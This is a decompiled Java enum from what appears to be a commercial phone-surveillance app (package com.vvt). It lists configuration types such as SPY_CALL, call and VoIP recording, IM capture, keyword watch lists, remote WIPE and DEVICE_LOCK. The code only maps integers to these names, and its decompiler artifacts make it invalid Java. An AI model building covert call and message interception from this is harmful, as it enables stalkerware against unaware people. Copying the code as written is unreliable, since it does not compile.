package com.vvt.preference;

import java.util.HashMap;
import java.util.Map;

public enum FxPreferenceType
{
  private static final Map a;
  private int mAppType;
  
  static
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    Object localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("ADDRESSBOOK", 0, 0);
    ADDRESSBOOK = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("APP_PROFILE", m, m);
    APP_PROFILE = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("URL_PROFILE", k, k);
    URL_PROFILE = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("CIS_NUMBER", j, j);
    CIS_NUMBER = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("DEVICE_LOCK", i, i);
    DEVICE_LOCK = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("EMERGENCY_NUMBER", 5, 5);
    EMERGENCY_NUMBER = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("EVENTS_CTRL", 6, 6);
    EVENTS_CTRL = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("HOME_NUMBER", 7, 7);
    HOME_NUMBER = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("KEYWORD", 8, 8);
    KEYWORD = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("MONITOR_NUMBER", 9, 10);
    MONITOR_NUMBER = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("NOTIFICATION_MESSAGES", 10, 11);
    NOTIFICATION_MESSAGES = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("NOTIFICATION_NUMBER", 11, 12);
    NOTIFICATION_NUMBER = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("PANIC", 12, 13);
    PANIC = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("RESTRICTION", 13, 14);
    RESTRICTION = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("SPY_CALL", 14, 15);
    SPY_CALL = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("WATCH_LIST", 15, 16);
    WATCH_LIST = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("WIPE", 16, 17);
    WIPE = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("MEDIA_HISTORICAL", 17, 18);
    MEDIA_HISTORICAL = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("CALL_RECORDING_WATCH_NUMBER", 18, 19);
    CALL_RECORDING_WATCH_NUMBER = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("CALL_RECORDING_WATCH_FLAG", 19, 20);
    CALL_RECORDING_WATCH_FLAG = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("CALL_RECORDING_AUDIO_SOURCE", 20, 21);
    CALL_RECORDING_AUDIO_SOURCE = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("TEMPORAL_CONTROL", 21, 22);
    TEMPORAL_CONTROL = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    ((FxPreferenceType)localObject).<init>("IM_CAPTURE_SETTINGS", 22, 23);
    IM_CAPTURE_SETTINGS = (FxPreferenceType)localObject;
    localObject = new com/vvt/preference/FxPreferenceType;
    int i1 = 23;
    int i2 = 24;
    ((FxPreferenceType)localObject).<init>("VOIP_CALLRECORDING_CAPTURE_SETTINGS", i1, i2);
    VOIP_CALLRECORDING_CAPTURE_SETTINGS = (FxPreferenceType)localObject;
    int i3 = 24;
    localObject = new FxPreferenceType[i3];
    FxPreferenceType localFxPreferenceType1 = ADDRESSBOOK;
    localObject[0] = localFxPreferenceType1;
    localFxPreferenceType1 = APP_PROFILE;
    localObject[m] = localFxPreferenceType1;
    localFxPreferenceType1 = URL_PROFILE;
    localObject[k] = localFxPreferenceType1;
    localFxPreferenceType1 = CIS_NUMBER;
    localObject[j] = localFxPreferenceType1;
    localFxPreferenceType1 = DEVICE_LOCK;
    localObject[i] = localFxPreferenceType1;
    FxPreferenceType localFxPreferenceType2 = EMERGENCY_NUMBER;
    localObject[5] = localFxPreferenceType2;
    localFxPreferenceType2 = EVENTS_CTRL;
    localObject[6] = localFxPreferenceType2;
    localFxPreferenceType2 = HOME_NUMBER;
    localObject[7] = localFxPreferenceType2;
    localFxPreferenceType2 = KEYWORD;
    localObject[8] = localFxPreferenceType2;
    localFxPreferenceType2 = MONITOR_NUMBER;
    localObject[9] = localFxPreferenceType2;
    localFxPreferenceType2 = NOTIFICATION_MESSAGES;
    localObject[10] = localFxPreferenceType2;
    localFxPreferenceType2 = NOTIFICATION_NUMBER;
    localObject[11] = localFxPreferenceType2;
    localFxPreferenceType2 = PANIC;
    localObject[12] = localFxPreferenceType2;
    localFxPreferenceType2 = RESTRICTION;
    localObject[13] = localFxPreferenceType2;
    localFxPreferenceType2 = SPY_CALL;
    localObject[14] = localFxPreferenceType2;
    localFxPreferenceType2 = WATCH_LIST;
    localObject[15] = localFxPreferenceType2;
    localFxPreferenceType2 = WIPE;
    localObject[16] = localFxPreferenceType2;
    localFxPreferenceType2 = MEDIA_HISTORICAL;
    localObject[17] = localFxPreferenceType2;
    localFxPreferenceType2 = CALL_RECORDING_WATCH_NUMBER;
    localObject[18] = localFxPreferenceType2;
    localFxPreferenceType2 = CALL_RECORDING_WATCH_FLAG;
    localObject[19] = localFxPreferenceType2;
    localFxPreferenceType2 = CALL_RECORDING_AUDIO_SOURCE;
    localObject[20] = localFxPreferenceType2;
    localFxPreferenceType2 = TEMPORAL_CONTROL;
    localObject[21] = localFxPreferenceType2;
    localFxPreferenceType2 = IM_CAPTURE_SETTINGS;
    localObject[22] = localFxPreferenceType2;
    localFxPreferenceType2 = VOIP_CALLRECORDING_CAPTURE_SETTINGS;
    localObject[23] = localFxPreferenceType2;
    b = (FxPreferenceType[])localObject;
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    a = (Map)localObject;
    localObject = values();
    int i4 = localObject.length;
    while (n < i4)
    {
      localFxPreferenceType2 = localObject[n];
      Map localMap = a;
      m = localFxPreferenceType2.mAppType;
      Integer localInteger = Integer.valueOf(m);
      localMap.put(localInteger, localFxPreferenceType2);
      n += 1;
    }
  }
  
  private FxPreferenceType(int paramInt1)
  {
    this.mAppType = paramInt1;
  }
  
  public static FxPreferenceType forValue(int paramInt)
  {
    Map localMap = a;
    Integer localInteger = Integer.valueOf(paramInt);
    return (FxPreferenceType)localMap.get(localInteger);
  }
  
  public int getValue()
  {
    return this.mAppType;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/preference/FxPreferenceType.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */